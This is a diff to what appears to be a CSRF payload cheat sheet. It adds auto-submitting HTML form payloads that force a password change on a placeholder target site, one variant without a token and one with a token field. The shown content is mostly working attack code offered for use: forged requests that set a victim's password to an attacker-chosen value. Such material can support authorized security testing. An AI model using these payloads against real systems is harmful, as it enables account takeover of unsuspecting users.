@@ -55,11 +55,23 @@ password=newpass&comfirm_password=newpass
 
 **Exploit CSRF Vulnerability Via HTML Injections (POST Method)**
 
->Form + Script Tag
+>Form + Script Tag (Without Token)
 ```
 <form action="http://target-vuln-web.com/user/new_password" method="POST">
             <input type="hidden" name="password" value="newpass" />
             <input type="hidden" name="comfirm_password" value="newpass" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+```
+
+>Form + Script Tag (With Token)
+```
+<form action="http://target-vuln-web.com/user/new_password" method="POST">
+            <input type="hidden" name="password" value="newpass" />
+            <input type="hidden" name="comfirm_password" value="newpass" />
+            <input type="hidden" name="token" value="tokenishere" />
         </form>
         <script>
             document.forms[0].submit();
